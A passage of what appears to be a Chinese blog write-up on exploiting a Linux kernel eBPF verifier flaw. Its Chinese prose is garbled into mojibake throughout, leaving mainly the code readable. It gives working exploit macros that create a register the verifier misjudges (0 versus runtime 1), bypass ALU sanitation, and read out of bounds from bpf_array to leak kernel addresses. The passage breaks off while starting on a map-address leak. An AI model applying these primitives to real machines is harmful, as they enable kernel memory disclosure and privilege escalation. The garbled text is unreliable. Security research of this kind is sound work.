32ä½è¾¹ç•Œå€¼ä¸º <code>[1, 1]</code>ï¼Œä¹‹å verifier ä¼šè°ƒç”¨ <code>__reg_bound_offset()</code> åå‘èµ‹å€¼ç»™ <code>var_off</code>ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„ <code>var_off</code> çš„ 32 ä½å€¼ä¾¿ä¸º <code>1</code>ï¼Œä½†å®é™…ä¸Šçš„ 32 ä½å€¼ä¸º 0ï¼Œæˆ‘ä»¬ä¾¿è·å¾—äº†ä¸€ä¸ª<strong>è¿è¡Œæ—¶ä¸º 0 ã€verifier è®¤ä¸ºæ˜¯ 1 çš„å¯„å­˜å™¨</strong></p><p><img src="https://s2.loli.net/2023/06/03/C3PqmrvoNpFXJVc.png" alt="R6 += R7"></p><p>è¿™æ ·ä¸€ä¸ªå¯„å­˜å™¨å¥½åƒå¯¹æˆ‘ä»¬æ¥è¯´æ²¡æœ‰å¤ªå¤šä½œç”¨ï¼Œä½†å¦‚æœæˆ‘ä»¬å†ç»™ <code>R6</code> åŠ ä¸Š <code>1</code> ï¼Œä»è€Œä½¿å¾— 32 ä½ <code>var_off</code> å˜ä¸º <code>2</code>ï¼Œ<strong>ä½†å®é™…ä¸Šçš„ 32 ä½å€¼ä¸º 1</strong>ï¼Œæˆ‘ä»¬å†å°† <code>R6</code> ä¸ <code>1</code> åš <code>&amp;</code> è¿ç®—ï¼Œ<strong>verifier ä¾¿ä¼šè®¤ä¸ºè¯¥å¯„å­˜å™¨çš„å€¼å˜ä¸º 0ï¼Œä½†å…¶å®é™…ä¸Šçš„è¿è¡Œæ—¶å€¼ä¸º 1</strong></p><p><img src="https://s2.loli.net/2023/06/03/shRKgi38zScMfOe.png" alt="R6 += 1"></p><p><img src="https://s2.loli.net/2023/06/03/UBW2qvyrlsVax4I.png" alt="verifier:0, runtime:1"></p><p>æœ‰äº†è¿™æ ·ä¸€ä¸ªå¯„å­˜å™¨ï¼Œåé¢æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ä¸ºæ‰€æ¬²ä¸ºäº†ï¼šï¼‰</p><p>å¯¹äº <code>R7</code> çš„æ„é€ ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä» map ä¸­å–å€¼è·å–ä¸€ä¸ª verifier å…¨ä¸å¯çŸ¥çš„å¯„å­˜å™¨ï¼Œä¹‹ååˆ©ç”¨ 32 ä½åˆ¤æ–­è·³è½¬æŒ‡ä»¤ <code>BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2)</code> ä½¿å…¶å˜ä¸º <code>&#123; .var_off = 0, .mask = 0xffffffff00000001&#125;</code> å³å¯ï¼Œmap ä¸­çš„å€¼æ˜¯æˆ‘ä»¬å¯æ§çš„æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿å…¶è¿è¡Œæ—¶å€¼ä¸º 0 ï¼š</p><blockquote><p>æ³¨ï¼šä½ ä¹Ÿå¯ä»¥å…ˆç»™ R6 +&#x3D; 1 å† R6 &amp;&#x3D; R7ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br></code></pre></td></tr></table></figure><blockquote><p>å¯èƒ½å¤§å®¶ä¼šæƒ³åˆ°å¯¹äºæ¡ä»¶è·³è½¬æŒ‡ä»¤è€Œè¨€ verifier ä¸»è¦æ ¹æ®è¾¹ç•Œå€¼è¿›è¡Œåˆ¤æ–­ï¼Œæˆ–è®¸æˆ‘ä»¬èƒ½å¤Ÿæ„é€ ä¸€ä¸ªè¿è¡Œæ—¶ä¸ºçœŸä½† verifier è®¤ä¸ºå‡çš„æ¡ä»¶è·³è½¬è¯­å¥ï¼ˆä¾‹å¦‚ <code>BPF_JMP32_IMM(BPF_JGE, BPF_REG_6, 1, 1)</code>ï¼‰å¹¶åœ¨ verifier è®¤ä¸ºæ’ä¸ºå‡ä½†è¿è¡Œæ—¶ä¸ºçœŸçš„åˆ†æ”¯ä¸­éšè—æ¶æ„æŒ‡ä»¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">is_branch32_taken</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u32 val, u8 opcode)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">subreg</span> =</span> tnum_subreg(reg-&gt;var_off);<br>s32 sval = (s32)val;<br><br><span class="hljs-keyword">switch</span> (opcode) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_JGE:<br><span class="hljs-keyword">if</span> (reg-&gt;u32_min_value &gt;= val)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (reg-&gt;u32_max_value &lt; val)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>ä½†è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªå¯è¡Œçš„æ–¹æ¡ˆï¼Œå› ä¸ºå¯¹äºä¸å¯è¾¾æŒ‡ä»¤ï¼ˆdead codeï¼‰ï¼Œ<strong>verifierä¼šå°†å…¶ patch ä¸ºè·³è½¬å›æ¡ä»¶åˆ†æ”¯æŒ‡ä»¤</strong>ï¼Œä»è€Œå¯¼è‡´æˆ‘ä»¬æ— æ³•åœ¨æ­¤å¤„è—å…¥æ¶æ„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sanitize_dead_code</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn_aux_data</span> *<span class="hljs-title">aux_data</span> =</span> env-&gt;insn_aux_data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">trap</span> =</span> BPF_JMP_IMM(BPF_JA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">insn</span> =</span> env-&gt;prog-&gt;insnsi;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> insn_cnt = env-&gt;prog-&gt;len;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++) &#123;<br><span class="hljs-keyword">if</span> (aux_data[i].seen)<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-built_in">memcpy</span>(insn + i, &amp;trap, <span class="hljs-keyword">sizeof</span>(trap));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="ä¸‰ã€å†…æ ¸åœ°å€æ³„éœ²"><a href="#ä¸‰ã€å†…æ ¸åœ°å€æ³„éœ²" class="headerlink" title="ä¸‰ã€å†…æ ¸åœ°å€æ³„éœ²"></a>ä¸‰ã€å†…æ ¸åœ°å€æ³„éœ²</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•æ³„éœ²å†…æ ¸åœ°å€ï¼Œæ¯”è¾ƒå®¹æ˜“æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬æˆ–è®¸å¯ä»¥é€šè¿‡è¿™ä¸ªè¿è¡Œæ—¶ä¸º 1 è€Œ verifier è®¤ä¸ºæ˜¯ 0 çš„å¯„å­˜å™¨æ„é€ ä¸€äº›è¶Šç•Œè¯»å–ï¼Œè€Œ map æ˜¯æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥æ¥è§¦åˆ°çš„æŒ‡é’ˆä¹‹ä¸€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•ä»æ­¤å¤„ä¸‹æ‰‹</p><p>æˆ‘ä»¬æ˜¯å¦å¯ä»¥ç›´æ¥å‘  <code>BPF_FUNC_map_lookup_elem()</code>  ä¼ å…¥ä¸€ä¸ª verifier ç¡®ä¿¡ä¸º 0 ä½†å®é™…ä¸Šæ˜¯è´Ÿæ•°çš„å¯„å­˜å™¨å‘¢ï¼Ÿ<strong>ç­”æ¡ˆæ˜¯å¦å®šçš„</strong>ï¼Œå› ä¸ºå¯¹äº <code>BPF_MAP_TYPE_ARRAY</code> ç±»å‹çš„ map è€Œè¨€åœ¨æŸ¥æ‰¾å…ƒç´ æ—¶å®é™…ä¸Šä¼šè°ƒç”¨åˆ° <code>array_map_lookup_elem()</code> ï¼Œå…¶ index ä¸ºæ— ç¬¦å·ç±»å‹ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•å‰å‘è¯»å–ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Called from syscall or from eBPF program */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">array_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *key)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> =</span> container_of(<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> bpf_array, <span class="hljs-built_in">map</span>);<br>u32 index = *(u32 *)key;<br><br><span class="hljs-keyword">if</span> (unlikely(index &gt;= <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">array</span>-&gt;value + <span class="hljs-built_in">array</span>-&gt;elem_size * (index &amp; <span class="hljs-built_in">array</span>-&gt;index_mask);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†å½“æˆ‘ä»¬åœ¨ eBPF ç¨‹åºä¸­è°ƒç”¨ <code>BPF_FUNC_map_lookup_elem()</code>  æ—¶ï¼Œå…¶è¿”å›å€¼ä¸ºæŒ‡å‘ <code>value</code> çš„æŒ‡é’ˆï¼Œè€Œ<strong>è¿™ä¸ªæŒ‡é’ˆæ˜¯å…è®¸ä¸å¸¸é‡åšè¿ç®—çš„</strong>ï¼ˆç±»å‹ä¸º <code>PTR_TO_MAP_VALUE</code> ï¼‰ï¼Œç”±äºæˆ‘ä»¬æœ‰ä¸€ä¸ª verifier è®¤ä¸ºæ˜¯ 0 çš„å¯„å­˜å™¨ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾ç»•è¿‡å¯¹æŒ‡é’ˆèŒƒå›´çš„æ£€æŸ¥å¹¶å®Œæˆè¶Šç•Œè¯»å–â€¦â€¦å—ï¼Ÿ</p><h3 id="ALU-Sanitation-bypass"><a href="#ALU-Sanitation-bypass" class="headerlink" title="ALU Sanitation bypass"></a>ALU Sanitation bypass</h3><p><code>ALU Sanitation</code> æ˜¯ä¸€ä¸ªç”¨äº<strong>è¿è¡Œæ—¶åŠ¨æ€æ£€æµ‹</strong>çš„åŠŸèƒ½ï¼Œé€šè¿‡å¯¹ç¨‹åºæ­£åœ¨å¤„ç†çš„å®é™…å€¼è¿›è¡Œè¿è¡Œæ—¶æ£€æŸ¥ä»¥å¼¥è¡¥ verifier é™æ€åˆ†æçš„ä¸è¶³ï¼Œè¿™é¡¹æŠ€æœ¯é€šè¿‡è°ƒç”¨ <code>fixup_bpf_calls()</code> <strong>ä¸º eBPF ç¨‹åºä¸­çš„æ¯ä¸€æ¡æŒ‡ä»¤çš„å‰é¢éƒ½æ·»åŠ ä¸Šé¢å¤–çš„è¾…åŠ©æŒ‡ä»¤</strong>æ¥å®ç°</p><p>å¯¹äº <code>BPF_ADD</code> åŠ <code>BPF_SUB</code> è¿™æ ·çš„æŒ‡ä»¤è€Œè¨€ï¼Œä¼šæ·»åŠ å¦‚ä¸‹è¾…åŠ©æŒ‡ä»¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fixup_bpf_calls</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++, insn++) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (insn-&gt;code == (BPF_ALU64 | BPF_ADD | BPF_X) ||<br>    insn-&gt;code == (BPF_ALU64 | BPF_SUB | BPF_X)) &#123;<br><span class="hljs-type">const</span> u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;<br><span class="hljs-type">const</span> u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">insn_buf</span>[16];</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">patch</span> =</span> &amp;insn_buf[<span class="hljs-number">0</span>];<br><span class="hljs-type">bool</span> issrc, isneg;<br>u32 off_reg;<br><br>aux = &amp;env-&gt;insn_aux_data[i + delta];<br><span class="hljs-keyword">if</span> (!aux-&gt;alu_state ||<br>    aux-&gt;alu_state == BPF_ALU_NON_POINTER)<br><span class="hljs-keyword">continue</span>;<br><br>isneg = aux-&gt;alu_state &amp; BPF_ALU_NEG_VALUE;<br>issrc = (aux-&gt;alu_state &amp; BPF_ALU_SANITIZE) ==<br>BPF_ALU_SANITIZE_SRC;<br><br>off_reg = issrc ? insn-&gt;src_reg : insn-&gt;dst_reg;<br><span class="hljs-keyword">if</span> (isneg)<br>*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, <span class="hljs-number">-1</span>);<br>*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit - <span class="hljs-number">1</span>);<br>*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);<br>*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);<br>*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="hljs-number">0</span>);<br>*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="hljs-number">63</span>);<br><span class="hljs-keyword">if</span> (issrc) &#123;<br>*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX,<br> off_reg);<br>insn-&gt;src_reg = BPF_REG_AX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>*patch++ = BPF_ALU64_REG(BPF_AND, off_reg,<br> BPF_REG_AX);<br>&#125;<br><span class="hljs-keyword">if</span> (isneg)<br>insn-&gt;code = insn-&gt;code == code_add ?<br>     code_sub : code_add;<br>*patch++ = *insn;<br><span class="hljs-keyword">if</span> (issrc &amp;&amp; isneg)<br>*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, <span class="hljs-number">-1</span>);<br>cnt = patch - insn_buf;<br><br>new_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);<br><span class="hljs-keyword">if</span> (!new_prog)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>delta    += cnt - <span class="hljs-number">1</span>;<br>env-&gt;prog = prog = new_prog;<br>insn      = new_prog-&gt;insnsi + i + delta;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>aux-&gt;alu_limit</code> ä¸º<strong>å½“å‰æŒ‡é’ˆè¿ç®—èŒƒå›´</strong>ï¼Œåˆå§‹æ—¶ä¸º 0ï¼Œä¸æŒ‡é’ˆæ‰€åšçš„å¸¸é‡è¿ç®—åŒæ­¥ï¼Œå¯¹äºå‡æ³•è€Œè¨€å¯è¯»èŒƒå›´ä¸º <code>(ptr - alu_limit, ptr]</code> ï¼ˆä»¥æŒ‡é’ˆæœ€åˆæŒ‡å‘çš„åœ°å€ä¸º <code>0</code>ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦ç»•è¿‡è¿™ä¸ªæ£€æŸ¥</p><p>ç”±äºæˆ‘ä»¬æœ‰è¿è¡Œæ—¶ä¸º 1ã€verifier è®¤ä¸ºæ˜¯ 0 çš„å¯„å­˜å™¨ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·è°ƒæ•´èŒƒå›´ï¼š</p><ul><li>æ„é€ å¦å¤–ä¸€ä¸ªåŒæ ·æ˜¯è¿è¡Œæ—¶å€¼ä¸º 1ã€verifier è®¤ä¸ºæ˜¯ 0 çš„å¯„å­˜å™¨ <code>R8</code></li><li>å°† <code>R8</code> ä¹˜ä¸Šä¸€ä¸ªä¸å¤§äº value size çš„å€¼ï¼ˆä¾‹å¦‚ value size ä¸º <code>0x1000</code>ï¼Œ<code>R8</code> ä¾¿è®¾ä¸º <code>0x1000</code>ï¼‰</li><li>å°†æŒ‡å‘ map ç¬¬ä¸€ä¸ªå…ƒç´ ç¬¬ä¸€ä¸ªå­—èŠ‚ <code>value[0]</code> çš„å¯„å­˜å™¨ï¼ˆå‡è®¾ä¸º <code>R7</code> ï¼‰å…ˆåŠ ä¸Š <code>0x1000</code>ï¼Œæ­¤æ—¶ <code>alu_limit</code> å˜ä¸º <code>0x1000</code>ï¼Œ<code>R7</code> æŒ‡å‘ <code>value[0x1000]</code></li><li><code>R7 -= R8</code>ï¼Œç”±äº verifier è®¤ä¸º R8 ä¸º 0ï¼Œå› æ­¤ <code>alu_limit</code> ä¿æŒä¸å˜ï¼Œ<strong>ä½† R7 å®é™…ä¸Šå·²ç»æŒ‡å›äº†</strong> <code>value[0]</code></li></ul><p>ç”±æ­¤æˆ‘ä»¬ä¾¿èƒ½ç»§ç»­æ„‰å¿«åœ°è¿›è¡Œå‰å‘çš„è¶Šç•Œè¯»äº†</p><blockquote><p>æ³¨ï¼šåœ¨å†…æ ¸ç‰ˆæœ¬ 5.11.8 ä¹‹å‰ ALU Sanitation å­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼Œå³ <code>aux_alu_limit</code> è¢«åˆå§‹åŒ–ä¸º 0 ä»è€Œå¯¼è‡´ <code>0-1</code> é€ æˆæ•´å‹æº¢å‡ºå˜ä¸ºä¸€ä¸ªå·¨å¤§çš„å€¼ï¼Œåœ¨<a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899">è¿™ä¸ª commit</a> ä¸­æ‰è¢«ä¿®å¤ï¼Œå› æ­¤å¯¹äº 5.11.8 ä¹‹å‰ç‰ˆæœ¬çš„å†…æ ¸è€Œè¨€æ˜¯ä¸éœ€è¦ç»•è¿‡è¯¥æ£€æŸ¥çš„</p></blockquote><h3 id="OOB-read-on-bpf-array"><a href="#OOB-read-on-bpf-array" class="headerlink" title="OOB-read on bpf_array"></a>OOB-read on bpf_array</h3><p>ç°åœ¨è®©æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªå­˜æ”¾æ•°æ®çš„ä½ç½®é™„è¿‘æœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„æ•°æ®ï¼Œå¯¹äº <code>BPF_MAP_TYPE_ARRAY</code> ç±»å‹ çš„ map è€Œè¨€ï¼Œå…¶ wrapper ä¸º <code>bpf_array</code> ç±»å‹ï¼ˆå³ <code>bpf_map</code> å†…åµŒäºè¯¥ç»“æ„ä½“ä¸­ï¼‰ï¼Œ<strong>æ•°æ®åˆ™ç›´æ¥å­˜æ”¾åœ¨å…¶å†…éƒ¨çš„</strong> <code>value</code> <strong>æ•°ç»„æˆå‘˜å½“ä¸­</strong>ï¼Œå› æ­¤åœ¨æŸ¥æ‰¾å…ƒç´ æ—¶æˆ‘ä»¬è·å¾—çš„å…¶å®æ˜¯ä¸€ä¸ªæŒ‡å‘ <code>bpf_array</code> å†…éƒ¨çš„æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> <span class="hljs-title">map</span>;</span><br>u32 elem_size;<br>u32 index_mask;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array_aux</span> *<span class="hljs-title">aux</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>DECLARE_FLEX_ARRAY(<span class="hljs-type">char</span>, value) __aligned(<span class="hljs-number">8</span>);<br>DECLARE_FLEX_ARRAY(<span class="hljs-type">void</span> *, ptrs) __aligned(<span class="hljs-number">8</span>);<br>DECLARE_FLEX_ARRAY(<span class="hljs-type">void</span> __percpu *, pptrs) __aligned(<span class="hljs-number">8</span>);<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦å‰å‘è¯»å–ä¾¿èƒ½è¯»å–åˆ° <code>bpf_map</code>ï¼Œä¹‹åé€šè¿‡ <code>bpf_map</code> çš„å‡½æ•°è¡¨ï¼ˆ<code>bpf_map-&gt;ops</code> ï¼‰ä¾¿èƒ½æ³„éœ²å‡ºå†…æ ¸åœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬å°† <code>bpf_array_ops</code> çš„å€¼è¯»å–åˆ° <code>map[1]</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_KERNEL_INFO(__map_fd)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸæ³„éœ²å‡ºå†…æ ¸åœ°å€ï¼š</p><p><img src="https://s2.loli.net/2023/06/04/zE4t6RO8acsMbJV.png" alt="image.png"></p><blockquote><p>ç¬”è€…æœ¬æ¥æƒ³ç›´æ¥å†™ä¸€ä¸ªå¾ªç¯ç›´æ¥å¾€å‰ç›²è¯» <code>page_offset_base + 0x9d000</code> ï¼ˆé€šè¿‡ç‰©ç†åœ°å€ 0 å¤„æ•°æ®å®šä½ï¼‰ï¼Œä½†æ˜¯  <em>verifier è¦æ±‚ä¸èƒ½æœ‰å›å‘è¾¹</em>  ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯è€è€å®å®åœ°çœ‹ <code>bpf_array</code> å‘¨å›´çš„æ•°æ®ï¼šï¼‰</p></blockquote><h3 id="Leak-map-address"><a href="#Leak-map-address" class="headerlink" title="Leak map address"></a>Leak map address</h3><p>å½“æˆ‘ä»¬åœ¨è°ƒç”¨è¾…åŠ©å‡½æ•° <code>BPF_FUNC_map_lookup_elem()</code> æ—¶ï¼Œè¯¥å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªæŒ‡å‘ <code>value</code> çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½å¤Ÿç›´æ¥å°†è¿™ä¸ªå€¼å­˜æ”¾åˆ° map å½“ä¸­ä»è€Œæ³„éœ²å‡º map åœ°å€ï¼Ÿé€šå¸¸æƒ…å†µä¸‹ç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œverifier ä¼šæ£€æŸ¥å¯„å­˜å™¨çš„ç±»å‹å¹¶é˜»æ­¢æŒ‡é’ˆæ³„éœ²çš„æƒ…å†µå‘ç”Ÿ</p><p>ç°åœ¨è®©æˆ‘ä»¬æ€è€ƒå¦‚ä½•åˆ©ç”¨æˆ‘ä»¬çš„æ¼æ´å¯„å­˜å™¨ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæ³¨æ„åˆ° verifier åœ¨è·Ÿè¸ªæŒ‡é’ˆå¯„å­˜å™¨ä¸å¸¸é‡å¯„å­˜å™¨é—´è¿ç®—æ—¶ä¼šè°ƒç”¨åˆ° <code>adjust_ptr_min_max_vals()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 